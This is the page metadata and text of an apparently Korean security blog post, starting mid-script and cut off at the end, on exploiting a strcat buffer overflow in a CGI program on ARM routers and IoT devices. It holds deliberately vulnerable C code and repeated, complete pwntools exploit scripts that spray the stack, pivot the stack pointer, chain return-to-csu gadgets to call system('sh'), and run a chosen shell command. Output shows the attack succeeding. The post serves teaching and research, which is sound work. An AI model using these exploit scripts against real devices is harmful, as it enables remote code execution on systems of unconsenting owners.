(((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop # Fix the spray buffer. spray_fix = spray return spray def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\n\n\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) while True: stack = 0xbefe1dd4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) r = p.recv() p.close() if r.find(b&quot;200 OK&quot;) != -1: break log.info(&quot;Success!&quot;) if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 3): exploit(sys.argv[1], sys.argv[2]) else: print(&quot;{} [target-ip] [shell command]&quot;.format(sys.argv[0])) 끝내면서 CGI를 공격하는 방법에 대해 알아보았습니다. 일반적으로 웹 CGI 프로그램 혹은 CGI는 문자열을 처리하는 코드가 많습니다. 문자열을 처리하는 코드에서 주로 발생할 수 있는 String copy buffer overflow의 공격 방법에 대해 알아보았고, 안정적인 공격 코드를 작성하는 법에 대해 알아 보았습니다. 추가적인 질문 사항과 수정사항은 dhkim@stealien.com으로 남겨 주시면 감사하겠습니다. https://www.lighttpd.net/ &#8617; CGI Environment Variables &#8617; strcat &#8617; Buffer overflow &#8617; Return oriented programming &#8617;" />
<link rel="canonical" href="http://ufo.stealien.com/id/2020-08-20/cgi_exploit" />
<meta property="og:url" content="http://ufo.stealien.com/2020-08-20/cgi_exploit" />
<meta property="og:site_name" content="STEALIEN Technical Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-08-20T18:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Common ways to exploit CGI Buffer overflow." />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"김도현"},"headline":"Common ways to exploit CGI Buffer overflow.","dateModified":"2020-08-20T18:00:00+09:00","@type":"BlogPosting","datePublished":"2020-08-20T18:00:00+09:00","url":"http://ufo.stealien.com/2020-08-20/cgi_exploit","description":"Common ways to exploit CGI Buffer overflow. 다양한 임베디드 서비스 및 IoT에서 사용되는 CGI 프로그램을 공격하는 일반적인 방법에 대해 알아 보겠습니다. Common Gateway Interface CGI는 웹 서버상에서 사용자 프로그램을 동작시키기 위한 조합입니다. 존재하는 많은 웹 서버 프로그램은 CGI의 기능을 이용할 수 있습니다. CGI는 환경변수나 표준입출력을 다룰 수 있는 프로그램 언어에서라면 언어의 구별을 묻지 않고 확장하여 이용하는 것이 가능하나, 실행속도나 텍스트 처리의 용이함 등의 균형에 의해 펄이 사용되는 경우가 많았습니다.[^1] CGI는 주로 Router, NAS와 같은 다양한 Embedded device, IoT Service를 위해 사용됩니다. | Server | +--------+ | +-------------+ +-------------+ | Client |&lt;=---HTTP---=&gt;| HTTP Server |&lt;=---=&gt;| CGI Program | +--------+ | +-------------+ +-------------+ | | CGI: How-to Lighttpd1와 같이 HTTP 프로토콜을 처리하여 CGI 프로그램으로 전달 할 수 있는 웹 서버 역할을 하는 프로그램을 한가지 선정합니다. 그 후에 CGI 규약에 맞게 프로그램을 작성하면 됩니다. 본 챕터에서는 공격하기 위해 알아야하는 몇가지를 설명하겠습니다. 환경변수 환경변수에는 HTTP 프로토콜을 통해 클라이언트에게 제공받은 정보가 저장됩니다. 임의로 변조된 사용자의 값이 전달 될 수 있는 벡터는 다음과 같습니다.2 HTTP_COOKIE : 클라이언트의 Cookie입니다. HTTP_USER_AGENT : 클라이언트의 User agent입니다. QUERY_STRING : 클라이언트에게 제공받은 GET 쿼리 문자열입니다. 표준입출력 표준 출력을 통해 cgi 페이지로 접근한 클라이언트에게 그 내용을 전달할 수 있습니다. POST와 같은 HTTP Method를 서비스 하기 위해 CGI에서는 표준입력을 사용합니다. POST의 데이터를 전달 받기 위해서는 단순히 표준입력을 받기만 하면 우리는 POST를 통해 전달 된 데이터를 받아낼 수 있습니다. CGI 공격 vuln.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; char *param; int param_count; static inline char h2c(char h) // F -&gt; 15 { if (h &gt;= &#39;a&#39; &amp;&amp; h &lt;= &#39;f&#39;) return h - &#39;a&#39; + 0xa; if (h &gt;= &#39;A&#39; &amp;&amp; h &lt;= &#39;F&#39;) return h - &#39;A&#39; + 0xa; return h - &#39;0&#39;; } char u2c(char *u) // %00 -&gt; \\x00 { char ret = 0; if (*u == &#39;%&#39;) { ret += h2c(*(u+1)) * 0x10; ret += h2c(*(u+2)) * 0x01; } return ret; } int urldecode(char *s) { int index1 = 0; int index2 = 0; if (!s) return 1; if (s[index2] == &#39;?&#39;) index2++; param = s; param_count = 0; while (s[index2]) { if (s[index2] == &#39;%&#39;) { s[index1++] = u2c(s+index2); index2 += 3; } else if (s[index2] == &#39;&amp;&#39;) { s[index1++] = &#39;\\0&#39;; index2++; } else { if (s[index2] == &#39;=&#39;) param_count++; s[index1++] = s[index2++]; } } s[index1] = &#39;\\0&#39;; return 0; } int get_val(char *name, char *dest, size_t size) { int err = 1; char *param_c = param; size_t param_len = strlen(param_c); size_t name_len = strlen(name); if (!param || !param_count) { printf(&quot;no query.\\n&quot;); return 1; } for (int i = 0; i &lt; param_count; i++) { if (!memcmp(name, param_c, name_len) &amp;&amp; param_c[name_len] == &#39;=&#39;) { param_c += name_len + 1; strncpy(dest, param_c, size); err = 0; break; } else { param_c += param_len+1; param_len = strlen(param_c); } } return err; } int main(int argc, char **argv, char **envp) { char out[512]; char cmd[256]; char buf[256]; if (urldecode(getenv(&quot;QUERY_STRING&quot;))) { printf(&quot;urldecode error.\\n&quot;); return -1; } memset(out, 0, sizeof(out)); memset(cmd, 0, sizeof(cmd)); memset(buf, 0, sizeof(buf)); if (!get_val(&quot;time&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- time ------&#39; &gt;&gt; /tmp/out &amp;&amp; date &gt;&gt; /tmp/out;&quot;); if (!get_val(&quot;ifconfig&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- ifconfig --&#39; &gt;&gt; /tmp/out &amp;&amp; ifconfig bond0 &gt;&gt; /tmp/out;&quot;); if (!get_val(&quot;uname&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- uname -----&#39; &gt;&gt; /tmp/out &amp;&amp; uname -a &gt;&gt; /tmp/out;&quot;); system(&quot;rm -f /tmp/out&quot;); system(cmd); int fd; if ((fd = open(&quot;/tmp/out&quot;, O_RDONLY)) &lt; 0) return -1; read(fd, out, sizeof(out)); close(fd); if (!get_val(&quot;comment&quot;, buf, 0x100)) strcat(out, buf); puts(out); return 0; } 위 샘플 코드는 시스템의 time, ifconfig, uname의 결과값을 출력 해 주는 간단한 프로그램입니다. L109 QUERY_STRING을 통해 인풋 받는 GET Query의 디코딩을 처리합니다. L119~124 time, ifconfig, uname을 실행하는 명령어 조합을 cmd 버퍼에 복사합니다. L126~127 /tmp/out을 삭제 후 cmd 버퍼의 내용대로 명령어를 실행합니다. L129~133 /tmp/out 파일을 읽어 out버퍼에 복사합니다. L135~136 comment 의 값이 유효할 경우 그 값을 out 버퍼에 복사합니다. L138 out을 출력합니다. L136에서 strncat 대신 strcat3을 사용하기 때문에, out 버퍼에 이미 많은 양의 데이터가 채워져 있을 경우의 예외를 처리하지 않습니다. 이로 인해 Buffer overflow4가 발생하게 됩니다. 취약점 증명 취약점을 증명하기 위해 간단히 웹 브라우저를 사용할 수 있습니다. 위는 정상적인 프로그램의 실행 흐름을 나타냅니다. 위는 다수의 데이터를 comment 파라미터를 통해 전달 할 경우를 보여줍니다. Lighttpd의 경우 다음과 같이 core dump를 활성화 시킬 수 있습니다. cgi 프로그램이 존재하는 디렉토리에 core dump가 생성됩니다. $ echo &#39;server.core-files = &quot;enable&quot;&#39; &gt;&gt; /etc/lighttpd.conf $ kill -9 `pidof lighttpd` $ lighttpd -f /etc/lighttpd.conf -m /usr/local/lib 그 후, 해당 프로그램의 core dump를 확인합니다. /home/314ckC47 # ./gdb -q -c /path/to/core [New LWP 6007] Core was generated by `vuln.cgi&#39;. Program terminated with signal 11, Segmentation fault. #0 0x61616160 in ?? () (gdb) i r pc pc 0x61616160 0x61616160 $pc 레지스터가 변조 된 것을 알 수 있습니다. 공격 제약 일반적인 BOF 공격은 Return Oriented Programming(ROP)5을 주로 사용합니다. 하지만 이번 취약점을 공격하기에는 몇가지 제약이 있습니다. 문자열 복사를 통해 발생하는 Buffer overflow이기 때문에, ROP Payload에 Null byte가 포함 될 경우 성공적으로 공격을 수행할 수 없습니다. 공격에 사용할 수 있는 정적인 주소가 프로그램(vuln.cgi)이 로드 된 지점밖에 없습니다. 프로그램이 로드 된 주소값의 상위 1바이트는 Null-byte입니다. 이런 상황에서 구상할 수 있는 Payload는 다음과 같습니다. &lt;= 0x00000000 0xffffffff =&gt; +-----+-(out)---------------+-(BP)-+-(PC)-+-----+ | ... | ............ &#39;a&#39;*63 | BASE | JUMP | ... | +-----+---------------------+------+------+-----+ === Overflow ==&gt; JUMP에는 상위 1바이트가 Null-byte인 주소값을 삽입할 수 있습니다. BASE에는 Null-byte가 존재하지 않는 어떤 값을 삽입할 수 있습니다. 이런 모든 조건을 종합 해 보았을 때, 우리는 다음과 같이 공격을 구상해야합니다. PC를 단 한번 변조하여 공격자가 원하는 코드의 흐름을 획득 해야합니다. 연속적인 함수의 호출 또는 인자의 구성을 위해 Null-byte를 삽입할 수 있는 영역이 필요합니다. 연속적인 함수의 호출 또는 인자의 구성을 위해 SP를 변조할 수 있어야 합니다. Stack spray QUERY_STRING 환경변수는 스택에 저장되어 있습니다. 이를 활용하면 다음과 같이 Stack spray를 시도 할 수 있습니다. #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) def form_packet(ip, param): packet = &quot;&quot; packet += &quot;GET http://{}/vuln.cgi?{} HTTP/1.1\\r\\n&quot;.format(ip, param) packet += &quot;Host: {}\\r\\n&quot;.format(ip) packet += &quot;Connection: keep-alive\\r\\n&quot; packet += &quot;Content-Length: 0\\r\\n&quot; packet += &quot;User-Agent: Mozilla/5.0\\r\\n&quot; packet += &quot;Accept: */*\\r\\n&quot; packet += &quot;Origin: http://{}\\r\\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\\r\\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\\r\\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\\r\\n&quot; packet += &quot;\\r\\n&quot; return packet.encode() def form_param(payload, spray): return &quot;&amp;&quot;.join([&quot;ifconfig=y&quot;, &quot;comment=&quot;+payload, &quot;s=&quot;+spray]) def exploit(ip): payload = &#39;a&#39;*63 + &quot;STCK&quot; + &quot;JUMP&quot; spray = &#39;b&#39;*0x10000 param = form_param(payload, spray) packet = form_packet(ip, param) p = remote(ip, 80) p.send(packet) r = p.recv(1024).decode() log.info(r) p.close() if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 2): exploit(sys.argv[1]) else: print(&quot;{} [target-ip]&quot;.format(sys.argv[0])) 실제로 스택에 스프레이가 되었는지 확인합니다. (gdb) x/16wx $sp+0x380 0xbec65db8: 0x61616161 0x61616161 0x61616161 0x61616161 0xbec65dc8: 0x64646161 0x44446464 0x73004444 0x6262623d 0xbec65dd8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbec65de8: 0x62626262 0x62626262 0x62626262 0x62626262 (gdb) x/16wx $sp+0x380+0x10000 0xbec75db8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbec75dc8: 0x62626262 0x62626262 0x62626262 0x45520062 0xbec75dd8: 0x53455551 0x52555f54 0x762f3d49 0x2e6e6c75 0xbec75de8: 0x3f696763 0x6f636669 0x6769666e 0x6326793d (gdb) 스프레이가 잘 되었음을 확인 했습니다. 또한 Null-byte의 삽입이 가능한지의 여부를 확인합니다. # ... def exploit(ip): payload = &#39;a&#39;*63 + &#39;dddd&#39; + &#39;DDDD&#39; spray = &#39;%00&#39;*4 + &#39;b&#39;*(0x10000-12) param = form_param(payload, spray) packet = form_packet(ip, param) # ... 4바이트의 null을 삽입 해 봅니다. (gdb) x/16wx $sp+0x380 0xbed44db8: 0x61616161 0x61616161 0x61616161 0x61616161 0xbed44dc8: 0x64646161 0x44446464 0x73004444 0x0000003d 0xbed44dd8: 0x62626200 0x62626262 0x62626262 0x62626262 0xbed44de8: 0x62626262 0x62626262 0x62626262 0x62626262 (gdb) x/16wx $sp+0x380+0x10000 0xbed54db8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbed54dc8: 0x62626262 0x62620062 0x62626262 0x45520062 0xbed54dd8: 0x53455551 0x52555f54 0x762f3d49 0x2e6e6c75 0xbed54de8: 0x3f696763 0x6f636669 0x6769666e 0x6326793d (gdb) Null-byte를 삽입할 수 있는 영역임을 확인 했습니다. Stack Pointer 변조 armv7에서 R11 레지스터는 x86의 ebp와 같은 역할을 수행합니다. (gdb) disas main ... 0x00010c9c &lt;+624&gt;: mov r0, r3 // -- main epilogue -- 0x00010ca0 &lt;+628&gt;: sub sp, r11, #4 // r11(bp)에서 4를 뺀 값을 sp에 저장합니다. 0x00010ca4 &lt;+632&gt;: pop {r11, pc} // 스택에서 r11, pc를 순차적으로 pop합니다. ... 이를 활용하면 Stack pointer(sp)를 변조할 수 있습니다. 아래와 같은 순서의 명령을 수행한다고 가정합니다. ### Stage 1 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x00010ca0 | sub sp, r11, #4 | | 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f00 | | r11 0xbfff8f14 | +----------------------------------------------------------------+ ### Stage 2 ###################################################### +-Code-------------+---------------------------------------------+ | 0x00010ca0 | sub sp, r11, #4 | | pc &gt; 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f10 * | | r11 0xbfff8f14 | +----------------------------------------------------------------+ * r11에서 4를 뺀 값을 sp에 넣었습니다. ### Stage 3 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x00010ca0 | sub sp, r11, #4 | | 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f10 | | r11 0xbfff8f24 * | +----------------------------------------------------------------+ * sp(0xbfff8f10)에서 r11, pc를 pop 했습니다. ### Stage 4 ###################################################### +-Code-------------+---------------------------------------------+ | 0x00010ca0 | sub sp, r11, #4 | | pc &gt; 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f20 * | | r11 0xbfff8f24 | +----------------------------------------------------------------+ * r11에서 4를 뺀 값을 sp에 넣었습니다. sp의 값이 우리가 원하는 값(0xbfff8f20)으로 변조되었습니다. ### Stage 5 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x41414141 | ........................................... | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f28 | | r11 0x41414141 | +----------------------------------------------------------------+ * pc와 r11이 변조되었습니다. 위와 같은 방법으로 연속적인 함수의 호출 또는 인자의 구성을 위해 SP를 변조할 수 있습니다. 공격코드 작성 위 두가지 방법을 이용하면 다음과 같은 흐름으로 공격을 수행합니다. QUERY_STRING을 전달함으로 BOF를 발생시키고, 스택에 ROP Payload를 spray합니다. SP를 Stack spray된 영역으로 변조합니다. ROP Payload를 수행합니다. ASLR이 비활성화 되어있으면, ROP Payload를 즉각적으로 수행 할 수 있습니다. ASLR이 활성화 되어있으면, SP가 잘못된 영역을 역참조 할 수 있습니다. 이럴경우, 1을 다시 수행합니다. Case: ASLR 비활성화 다음과 같이 ASLR을 비활성화 할 수 있습니다. # echo 0 &gt; /proc/sys/kernel/randomize_va_space # cat /proc/sys/kernel/randomize_va_space 0 ASLR이 비활성화 된 후, 스프레이를 먼저 수행하여 core dump를 확인합니다. (gdb) x/32wx $sp+0x380 0xbefe1d98: 0x6161616b 0x6161616c 0x6161616d 0x6161616e 0xbefe1da8: 0xbefe1ddc 0x44444444 0x3d737300 0x41414141 0xbefe1db8: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dc8: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dd8: 0x41414141 0x41414141 0x41414141 0x41414141 Stack spray가 0xbefe1db4에서 시작합니다. 해당 주소로 sp를 변조합니다. SPRAY_LEN = 0xf000 leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} def payload(r11, lr, dummy_len): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def spray(): spray = &quot;A&quot;*SPRAY_LEN return spray def exploit(): # ... stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) # ... 위의 코드를 실행 후 다시 gdb로 확인합니다. (gdb) x/16wx $sp-0x10 0xbefe1dac: 0x00010ca0 0x3d737300 0x41414141 0x41414141 0xbefe1dbc: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dcc: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1ddc: 0x41414141 0x41414141 0x41414141 0x41414141 (gdb) i r pc pc 0x41414140 0x41414140 (gdb) 정상적으로 pc가 변조되었습니다. Return sled Return sled를 이용하여 스프레이한 영역의 어느곳으로 sp, pc가 변조되어도 공격자의 ROP Payload가 실행되도록 합니다. 0x00010ca4: pop {r11, pc} 0x000108e0: pop {r4, r11, pc} 위의 두 가젯을 활용합니다. ... | 0x00010ca4 | 0x00010ca4 | 0x000108e0 | 0x00010ca4 # r4 | 0x41414141 # r11 V [ROP HERE] # pc def spray(): # ... spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop return spray ROP Return-to-csu를 활용합니다. def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): #... # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) #... chain() 함수는 Return-to-csu 가젯을 자동으로 구성 해 줍니다. L18~22 : bss:0x20 지점에 get_val 함수의 포인터를 작성합니다. L25 : get_val 함수를 이용해 QUERY_STRING에서 t 쿼리의 값을 bss:0x24 지점에 작성합니다. 그 값은 &quot;sh&quot; 입니다. L26 : system 함수를 이용해 쉘을 실행시킵니다. 명령어 전달 ROP Payload가 수행되고 나면, 쉘 프로세스가 실행되고, 명령어 입력까지 대기합니다. POST 메소드를 이용해 Standard input으로 쉘 명령을 전달하여 실행시킵니다. def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\\r\\n&quot;.format(ip, param) packet += &quot;Host: {}\\r\\n&quot;.format(ip) packet += &quot;Connection: keep-alive\\r\\n&quot; packet += &quot;Content-Length: {}\\r\\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\\r\\n&quot; packet += &quot;Accept: */*\\r\\n&quot; packet += &quot;Origin: http://{}\\r\\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\\r\\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\\r\\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\\r\\n&quot; packet += &quot;\\r\\n&quot; packet += content packet += &quot;\\r\\n&quot; return packet.encode() 안정화 작업 def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\\n\\n\\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) p.close() log.info(&quot;Success!&quot;) ifconfig 명령의 출력값의 길이가 고정되어있지 않습니다. 오버플로우 사이즈를 안정적으로 계산하기 위해 ifconfig 명령 결과 버퍼의 길이값을 측정하고, 계산합니다. no-ASLR 공격 코드 #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) # Globals &amp; Defines spray_fix = &#39;&#39; SPRAY_LEN = 0xf000 EADDR_LEN = 12 # Gadgets sled_1 = 0x00010ca4 # pop {r11, pc} sled_2 = 0x000108e0 # pop {r4, r11, pc} csu_1 = 0x00010d28 csu_2 = 0x00010d0c leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} # ETC. str_t = 0x10e66 def purl32(value): a = (value &amp; 0x000000ff) &gt;&gt; 0 b = (value &amp; 0x0000ff00) &gt;&gt; 8 c = (value &amp; 0x00ff0000) &gt;&gt; 16 d = (value &amp; 0xff000000) &gt;&gt; 24 return &quot;%{:02x}%{:02x}%{:02x}%{:02x}&quot;.format(a,b,c,d) def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\\r\\n&quot;.format(ip, param) packet += &quot;Host: {}\\r\\n&quot;.format(ip) packet += &quot;Connection: keep-alive\\r\\n&quot; packet += &quot;Content-Length: {}\\r\\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\\r\\n&quot; packet += &quot;Accept: */*\\r\\n&quot; packet += &quot;Origin: http://{}\\r\\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\\r\\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\\r\\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\\r\\n&quot; packet += &quot;\\r\\n&quot; packet += content packet += &quot;\\r\\n&quot; return packet.encode() def form_param(payload=&#39;&#39;, spray=&#39;&#39;): p = [&quot;t=sh&quot;, &quot;ifconfig=y&quot;] if payload: p.append(&quot;comment=&quot;+payload) if spray: p.append(&quot;ss=&quot;+spray) return &quot;&amp;&quot;.join(p) def payload(r11, lr, dummy_len=54): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): # If we already got spray buffer, use it. global spray_fix if len(spray_fix): return spray_fix # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # Forming spray. spray = &#39;a&#39; * (SPRAY_LEN % EADDR_LEN) # padd spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop # Fix the spray buffer. spray_fix = spray return spray def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\\n\\n\\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) p.close() log.info(&quot;Success!&quot;) if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 3): exploit(sys.argv[1], sys.argv[2]) else: print(&quot;{} [target-ip] [shell command]&quot;.format(sys.argv[0])) bc@machine $ ./exploit.py 172.16.13.9 &#39;echo PWNED &gt; /tmp/pwned&#39; [*] &#39;/mnt/c/Users/314ckC47/Documents/CGI Exploitation/source/vuln&#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x10000) [*] Getting buffer. [*] Exploit. [*] Success! /home/314ckC47 $ cat /tmp/pwned PWNED Case: ASLR 활성화 다음과 같이 ASLR을 활성화합니다. # echo 0 &gt; /proc/sys/kernel/randomize_va_space # cat /proc/sys/kernel/randomize_va_space 0 종료 조건 sp가 참조하는 지점에 대해 Brute-forcing을 수행합니다. Brute-forcing의 종료 조건을 위해 ROP Payload가 성공적으로 수행 될 경우 프로그램을 abort시켜 500 Internal error를 발생시키지 않도록 합니다. # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # abort rop += &quot;AAAA&quot;*7 + purl32(abort) ASLR 공격 코드 #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) # Globals &amp; Defines spray_fix = &#39;&#39; SPRAY_LEN = 0xf000 EADDR_LEN = 12 # Gadgets sled_1 = 0x00010ca4 # pop {r11, pc} sled_2 = 0x000108e0 # pop {r4, r11, pc} csu_1 = 0x00010d28 csu_2 = 0x00010d0c leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} # ETC. str_t = 0x00010e66 abort = 0x0001055c def purl32(value): a = (value &amp; 0x000000ff) &gt;&gt; 0 b = (value &amp; 0x0000ff00) &gt;&gt; 8 c = (value &amp; 0x00ff0000) &gt;&gt; 16 d = (value &amp; 0xff000000) &gt;&gt; 24 return &quot;%{:02x}%{:02x}%{:02x}%{:02x}&quot;.format(a,b,c,d) def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\\r\\n&quot;.format(ip, param) packet += &quot;Host: {}\\r\\n&quot;.format(ip) packet += &quot;Connection: keep-alive\\r\\n&quot; packet += &quot;Content-Length: {}\\r\\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\\r\\n&quot; packet += &quot;Accept: */*\\r\\n&quot; packet += &quot;Origin: http://{}\\r\\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\\r\\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\\r\\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\\r\\n&quot; packet += &quot;\\r\\n&quot; packet += content packet += &quot;\\r\\n&quot; return packet.encode() def form_param(payload=&#39;&#39;, spray=&#39;&#39;): p = [&quot;t=sh&quot;, &quot;ifconfig=y&quot;] if payload: p.append(&quot;comment=&quot;+payload) if spray: 